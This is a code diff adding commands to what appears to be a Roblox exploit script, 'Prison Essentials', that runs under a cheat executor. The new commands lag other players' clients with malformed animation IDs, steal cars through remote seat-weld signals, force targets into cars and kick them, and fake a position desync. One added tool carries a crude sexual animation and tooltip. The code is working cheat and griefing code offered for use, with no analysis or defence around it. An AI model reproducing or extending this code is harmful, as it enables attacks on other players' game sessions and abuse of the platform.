+				table.clear(replicationOffsets)
+			end,
+		},
+
+		["disablereplicationoffset"] = {
+			["ListName"] = "disablereplicationoffset",
+			["Description"] = "Disables replication offset",
+			["Aliases"] = {""},
+			["Function"] = function(args, speaker)
+				replicationOffsetEnabled = false
+				RunService:UnbindFromRenderStep("ReplicationOffset")
+			end,
+		},
+
+		["newjerk"] = {
+			["ListName"] = "newjerk",
+			["Description"] = "hehe",
+			["Aliases"] = {""},
+			["Function"] = function(args, speaker)
+				local humanoid = speaker.Character:FindFirstChildWhichIsA("Humanoid")
+				local backpack = speaker:FindFirstChildWhichIsA("Backpack")
+				if not humanoid or not backpack then return end
+
+				local tool = Instance.new("Tool")
+				tool.Name = "Jerk Off V2"
+				tool.ToolTip = "in the stripped club. straight up \"jorking it\" . and by \"it\" , haha, well. let's justr say. My peanits."
+				tool.RequiresHandle = false
+				tool.Parent = backpack
+
+				local jorkin = false
+				local track: AnimationTrack
+
+				local function stopTomfoolery()
+					jorkin = false
+					if track then
+						track:Stop()
+						track = nil
+					end
+				end
+
+				local function pauseTomfoolery()
+					jorkin = false
+					if track then
+						track:AdjustWeight(0.001)
+						--track.Priority = Enum.AnimationPriority.Core
+					end
+				end
+
+				tool.Equipped:Connect(function()
+					jorkin = true
+					track:AdjustWeight(10)
+					--track.Priority = Enum.AnimationPriority.Action4
+					print(track.WeightCurrent)
+					print(track.Priority)
+				end)
+				tool.Unequipped:Connect(pauseTomfoolery)
+				humanoid.Died:Connect(stopTomfoolery)
+
+				while task.wait() do
+					if not jorkin then continue end
+
+					local isR15 = r15(speaker)
+					if not track then
+						local anim = Instance.new("Animation")
+						anim.AnimationId = not isR15 and "rbxassetid://72042024" or "rbxassetid://698251653"
+						track = humanoid:LoadAnimation(anim)
+						track.Priority = Enum.AnimationPriority.Action4
+						track.Looped = true
+						track:Play()
+						track:AdjustWeight(10)
+					end
+
+
+					track:AdjustSpeed(isR15 and 0.7 or 0.65)
+					track.TimePosition = 0.6
+					task.wait(.1)
+					while track and track.TimePosition < (not isR15 and 0.65 or 0.7) do task.wait() end
+					--if track then
+					--	track:Stop()
+					--	track = nil
+					--end
+				end
+			end,
+		},
+
+		["sitincar"] = {
+			["ListName"] = "sitincar",
+			["Description"] = "Sit in someone's car",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				local character = speaker.Character
+				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end
+
+				local humanoid = character:FindFirstChild("Humanoid")
+				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end
+
+				local players = getPlayer(args[1], speaker)
+				local targetName = players[1]
+				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
+				local target = Players:FindFirstChild(targetName)
+				local targetChar = target.Character
+				if not targetChar then notify("Prison Essentials:", "Target has no character") return end
+				local targetHumanoid = targetChar:FindFirstChild("Humanoid")
+				if not targetHumanoid and targetHumanoid.Health > 0 and not targetHumanoid.SeatPart then notify("Prison Essentials:", "Target has no humanoid, isn't sitting or is dead") return end
+				local isCar = targetHumanoid.SeatPart.Name == "VehicleSeat" and targetHumanoid.SeatPart.Parent.Name == "Body"
+				if not isCar then return end
+				local car = targetHumanoid.SeatPart.Parent.Parent
+				local seats = {}
+				for i, v in car.Body:GetChildren() do
+					if v:IsA("Seat") and not v.Occupant then
+						table.insert(seats, v)
+					end
+				end
+
+				if humanoid.SeatPart then
+					humanoid.Jump = true
+				end
+
+				if #seats < 0 then return end
+				seats[1]:Sit(humanoid)
+			end,
+		},
+
+		["autostealcar"] = {
+			["ListName"] = "autostealcar",
+			["Description"] = "Automatically steals a car when a player enters it",
+			["Aliases"] = {"autosteal"},
+			["Function"] = function(args, speaker)
+				autoStealCarEnabled = true
+				workspace.CarContainer.ChildAdded:Connect(function(car)
+					if not autoStealCarEnabled then return end
+					local body = car:WaitForChild("Body", 5)
+					if not body then return end
+					local seat = body:WaitForChild("VehicleSeat", 1)
+					if not seat then return end
+					local oldSeatCFrame = seat.CFrame
+
+					local character = speaker.Character
+					local humanoid: Humanoid = character:FindFirstChildOfClass("Humanoid")
+					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+					if not humanoid or humanoid.Health <= 0 or humanoid.SeatPart or not humanoidRootPart then return end
+
+					local oldCFrame = humanoidRootPart.CFrame
+
+					--task.spawn(function()
+					--	humanoid.Seated:Wait()
+					--	RunService.Heartbeat:Wait()
+					--	humanoidRootPart.CFrame = oldCFrame
+					--	humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
+					--end)
+
+					replicatesignal(seat.RemoteCreateSeatWeld, humanoid)
+					task.wait(1/60)
+					replicatesignal(seat.RemoteDestroySeatWeld)
+					humanoid:GetPropertyChangedSignal("SeatPart"):Wait()
+					RunService.Heartbeat:Wait()
+					humanoidRootPart.CFrame = oldCFrame
+				end)
+			end,
+		},
+
+		["disableautostealcar"] = {
+			["ListName"] = "disableautostealcar",
+			["Description"] = "Disables auto steal car",
+			["Aliases"] = {"disableautosteal"},
+			["Function"] = function(args, speaker)
+				autoStealCarEnabled = false
+			end,
+		},
+
+		["lagotherclients"] = {
+			["ListName"] = "lagotherclients",
+			["Description"] = "Lags other clients",
+			["Aliases"] = {"lagothers"},
+			["Function"] = function(args, speaker)
+				lagOtherClientsEnabled = false
+				task.wait()
+				lagOtherClientsEnabled = true
+				local animName = string.rep("\n", 128)
+				while lagOtherClientsEnabled do
+					RunService.Heartbeat:Wait()
+					local character = speaker.Character
+					if not character then continue end
+					local humanoid = character:FindFirstChildOfClass("Humanoid")
+					if not humanoid then continue end
+					local animator = humanoid:FindFirstChildOfClass("Animator")
+					if not animator then continue end
+					for i = 1, 16 do
+						local animation = Instance.new("Animation")
+						animation.AnimationId = 'http=507770677\1'..math.random(1, 1000000)..'\n'..animName..'\n'
+						local anim = animator:LoadAnimation(animation)
+						anim:Play(0, 0.0001, 0)
+						anim:Destroy()
+						animation:Destroy()
+						anim = nil
+						animation = nil
+					end
+				end
+			end,
+		},
+
+		["disablelagotherclients"] = {
+			["ListName"] = "disablelagotherclients",
+			["Description"] = "Disables lag other clients",
+			["Aliases"] = {"disablelagothers"},
+			["Function"] = function(args, speaker)
+				lagOtherClientsEnabled = false
+			end,
+		},
+
+		["fakedesync"] = {
+			["ListName"] = "fakedesync",
+			["Description"] = "Fakes a desync",
+			["Aliases"] = {""},
+			["Function"] = function(args, speaker)
+				fakeDesyncEnabled = false
+
+				task.wait()
+
+				fakeDesyncEnabled = true
+				local character = speaker.Character
+				if not character then return end
+				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+				if not humanoidRootPart then return end
+
+				local realCFrame = humanoidRootPart.CFrame
+				local oldVel = humanoidRootPart.AssemblyLinearVelocity
+				local oldAngularVelocity = humanoidRootPart.AssemblyAngularVelocity
+				local i = 0
+
+				speaker.CharacterAdded:Connect(function(char)
+					character = char
+					humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					realCFrame = humanoidRootPart.CFrame
+					oldVel = humanoidRootPart.AssemblyLinearVelocity
+				end)
+
+				RunService:UnbindFromRenderStep("FakeDesync")
+
+				RunService:BindToRenderStep("FakeDesync", 100, function(delta: number)
+					if not humanoidRootPart.Parent then return end
+					humanoidRootPart.CFrame = realCFrame
+					humanoidRootPart.AssemblyLinearVelocity = oldVel
+					humanoidRootPart.AssemblyAngularVelocity = oldAngularVelocity
+				end)
+
+
+				while fakeDesyncEnabled do
+					RunService.PostSimulation:Wait()
+					if not humanoidRootPart.Parent then continue end
+					realCFrame = humanoidRootPart.CFrame
+					oldVel = humanoidRootPart.AssemblyLinearVelocity
+					oldAngularVelocity = humanoidRootPart.AssemblyAngularVelocity
+					i = (i + 1) % 2
+					local randomVector = Vector3.new(((math.random() - .5) * 2), ((math.random() - .5) * 2), ((math.random() - .5) * 2)).Unit
+					if i ~= 0 then
+						humanoidRootPart.CFrame = farCFrame
+						humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
+						humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
+						RunService.Heartbeat:Wait()
+						humanoidRootPart.CFrame = closeCFrame * CFrame.new((randomVector * Vector3.new(1, 0, 1)).Unit * 1000, randomVector)
+					end
+					humanoidRootPart.AssemblyLinearVelocity = (randomVector) * 20000
+					humanoidRootPart.AssemblyAngularVelocity = randomVector * 25000
+				end
+			end,
+		},
+
+		["disablefakedesync"] = {
+			["ListName"] = "disablefakedesync",
+			["Description"] = "Disables fake desync",
+			["Aliases"] = {"unfakedesync"},
+			["Function"] = function(args, speaker)
+				execCmd("breakvelocity")
+				fakeDesyncEnabled = false
+				RunService.RenderStepped:Wait()
+				task.wait()
+				RunService:UnbindFromRenderStep("FakeDesync")
+			end,
+		},
+
+		["kidnapkick"] = {
+			["ListName"] = "kidnapkick",
+			["Description"] = "Forces target to sit in a car and kicks them",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				local character = speaker.Character
+				if not character then notify("Prison Essentials:", "Could not locate your Character model. Please respawn.") return end
+
+				local humanoid = character:FindFirstChild("Humanoid")
+				if not humanoid then notify("Prison Essentials:", "Humanoid is missing. Try resetting.") return end
+
+				local players = getPlayer(args[1], speaker)
+				local targetName = players[1]
+				if not targetName then notify("Prison Essentials:", "Could not find a player matching that name.") return end
+				local target = Players:FindFirstChild(targetName)
+				local targetChar = target.Character
+				if not targetChar then notify("Prison Essentials:", "Target has no character") return end
+				local targetHumanoid = targetChar:FindFirstChild("Humanoid")
+				if not targetHumanoid or targetHumanoid.Health <= 0 then notify("Prison Essentials:", "Target has no humanoid, isn't sitting or is dead") return end
+				local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
+				local targetCar = targetHumanoid.SeatPart
+				if targetCar then
+					execCmd("kick " .. targetName)
+					return
+				end
+
+				--local car = getCar()
+				local _cars = workspace.CarContainer:GetChildren()
+				local cars = {}
+
+				for i, v in ipairs(_cars) do
+					local carSeat = v.Body:FindFirstChild("VehicleSeat")
+					if not carSeat then continue end
+					if isNetworkOwner(carSeat) then
+						table.insert(cars, v)
+					end
+				end
+
+				local switchIndex = 0
+				local doing = true
+
+				while targetChar.Parent and doing do
+					--RunService.PostSimulation:Wait()
+					--for _, car in cars do
+					--	local carSeat = car.Body:FindFirstChild("VehicleSeat")
+					--	if not carSeat then continue end
+					--	carSeat.CFrame = farCFrame
+					--end
+					RunService.Heartbeat:Wait()
+					--if not car or not car.Parent then break end
+
+					for _, car in cars do
+						local carSeat = car.Body:FindFirstChild("VehicleSeat")
+						local wheels = car:FindFirstChild("Wheels")
+						if not carSeat then continue end
+						if not wheels then continue end
+
+						for i, v in wheels:GetChildren() do
+							v.CFrame = farCFrame
+						end
+
+						--switchIndex = (switchIndex + 1) % switchModulo
+						--if switchIndex == 0 then
+							setPhysicsRootRef(carSeat, targetHrp)
+							carSeat.CFrame = targetHrp.CFrame
+						--else
+						--	setPhysicsRootRef(carSeat, nil)
+						--	carSeat.CFrame = character.HumanoidRootPart.CFrame + Vector3.new(0, -10, 0)
+						--end
+						local dir = (targetHrp.CFrame.Position - carSeat.CFrame.Position).Unit
+						--carSeat.AssemblyLinearVelocity = dir * 100000
+						sethiddenproperty(carSeat, "NetworkIsSleeping", true)
+						if not isNetworkOwner(carSeat) and car.Parent then
+							task.delay(kickDelay, carKick, car)
+							doing = false
+							break
+						end
+						--sethiddenproperty(carSeat, "NetworkOwnershipRule", Enum.NetworkOwnership.OnContact)
+					end
+				end
+				if targetChar.Parent and targetHumanoid.SeatPart then
+					execCmd("kick " .. targetName)
+				end
+				--freeCar(car)
+			end
+		},
+
+		["setsimradius"] = {
+			["ListName"] = "setsimradius",
+			["Description"] = "Sets the simulation radius for the server",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				local newRadius = tonumber(args[1])
+				if newRadius then
+					simRadius = newRadius
+					notify("Prison Essentials:", "Simulation radius set to " .. newRadius)
+				end
+			end
+		},
+
+		["setkickdelay"] = {
+			["ListName"] = "setkickdelay",
+			["Description"] = "Sets the delay before kicking a player after kidnapping them",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				local newDelay = tonumber(args[1])
+				if newDelay then
+					kickDelay = newDelay
+					notify("Prison Essentials:", "Kick delay set to " .. newDelay .. " seconds")
+				end
+			end
+		},
+
+		["setgettoolspeed"] = {
+			["ListName"] = "setgettoolspeed",
+			["Description"] = "Sets the speed for the get tool command",
+			["Aliases"] = {},
+			["Function"] = function(args, speaker)
+				local newSpeed = tonumber(args[1])
+				if newSpeed then
+					getToolSpeed = newSpeed
+					notify("Prison Essentials:", "Get tool speed set to " .. newSpeed)
+				end
+			end
+		},
+
+		
 		["execute"] = {
 			["ListName"] = "execute [script]",
 			["Description"] = "Executes a script",
 			["Aliases"] = {"exec"},
 			["Function"] = function(args, speaker)
 				local source = table.concat(args, " ")
+				print(source)
 				if not source or source == "" then notify("Prison Essentials:", "Please provide a script to execute.") return end
 				local func = loadstring(source)
 				if not func then notify("Prison Essentials:", "Failed to load script.") return end
